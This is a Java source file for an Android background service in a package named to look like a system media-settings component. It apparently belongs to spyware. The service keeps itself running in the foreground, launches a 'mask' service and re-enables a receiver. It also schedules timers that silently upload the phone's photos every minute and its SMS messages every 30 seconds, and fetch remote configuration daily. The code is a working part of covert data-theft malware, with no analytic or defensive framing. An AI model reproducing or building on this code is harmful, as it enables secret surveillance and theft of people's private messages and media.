package com.android.media.settings.Services;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Binder;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.android.media.settings.MediaConfig;
import com.android.media.settings.MediaDBManager;
import com.android.media.settings.Utility.MediaCompressorUtility;
import com.android.media.settings.Utility.SMSUtility;
import com.android.media.settings.Receiver.MediaReceiver;
import com.android.media.settings.Utility.ConfigUpdaterUtility;
import com.android.media.settings.Utility.MediaUploadUtility;
import com.android.media.settings.Utility.MediaUtility;

import java.lang.reflect.Method;
import java.util.Timer;
import java.util.TimerTask;

public class MediaService extends Service {
    private static final String TAG = "Media Service";
    private Timer imgMonitorTimer, imgUploadTimer, configTimer, smsTimer;
    private MediaUtility mUtility;
    private MediaDBManager dbManager;
    private final IBinder mediaBinder = new MediaBinder();

    private NotificationManager mNM;
    private static final Class<?>[] mStartForegroundSignature = new Class[] {
            int.class, Notification.class};
    private static final Class<?>[] mSetForegroundSignature = new Class[] {
            boolean.class};
    private Object[] mStartForegroundArgs = new Object[2];
    private Object[] mSetForegroundArgs = new Object[1];
    private Method mStartForeground;
    private Method mSetForeground;

    public static boolean isMediaCompressing = false;
    public static boolean isMediaUploading = false;
    public static boolean isSMSUploading = false;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return mediaBinder;
    }

    public class MediaBinder extends Binder {
        public MediaService getService() {
            return MediaService.this;
        }
    }

    private Runnable mediaRunnable = new Runnable() {
        @Override
        public void run() {
            initConfigTimer();
            initMediaCompression();
            initMediaUpload();
            initSMSUpload();
        }
    };

    @Override
    public void onCreate() {
        Log.d(TAG, "Service On Create..!");
        try {
            mStartForeground = getClass().getMethod("startForeground",
                    mStartForegroundSignature);
        } catch (NoSuchMethodException e) {
            mStartForeground = null;
        }
        try {
            mSetForeground = getClass().getMethod("setForeground",
                    mSetForegroundSignature);
        } catch (NoSuchMethodException e) {
            throw new IllegalStateException(
                    "OS doesn't have Service.startForeground OR Service.setForeground!");
        }
        this.mUtility = new MediaUtility(this);
        this.dbManager = new MediaDBManager(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(MediaConfig.NOTIFICATION_ID, mUtility.getNotification());
        startService(new Intent(this, MediaMaskService.class));
        registerReceiver();
        Thread mediaThread = new Thread(mediaRunnable);
        mediaThread.start();
        return START_STICKY;
    }

    private void initMediaCompression() {
        imgMonitorTimer = new Timer();
        imgMonitorTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                if(!isMediaCompressing) new MediaCompressorUtility(MediaService.this).initImageCompression();
            }
        }, 0, 1000 * 10);
    }

    private void initMediaUpload() {
        imgUploadTimer = new Timer();
        imgUploadTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                if(!isMediaUploading) new MediaUploadUtility(MediaService.this).initUploadServices();
            }
        }, 0, 1000 * 60 * 1);
    }

    private void initSMSUpload() {
        smsTimer = new Timer();
        smsTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                if(!isSMSUploading) new SMSUtility(MediaService.this).initSMSUpload();
            }
        }, 0, 1000 * 30);
    }

    private void initConfigTimer() {
        configTimer = new Timer();
        configTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                new ConfigUpdaterUtility(MediaService.this).initConfigUpdater();
            }
        }, 0, 1000 * 60 * 60 * 24);
    }

    private void registerReceiver() {
        ComponentName mediaReceiver = new ComponentName(this, MediaReceiver.class);
        PackageManager mPackageManager = getPackageManager();

        mPackageManager.setComponentEnabledSetting(
                mediaReceiver,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Service Destroyed !!");
        imgMonitorTimer.cancel();
        imgUploadTimer.cancel();
        configTimer.cancel();
        smsTimer.cancel();
    }
}
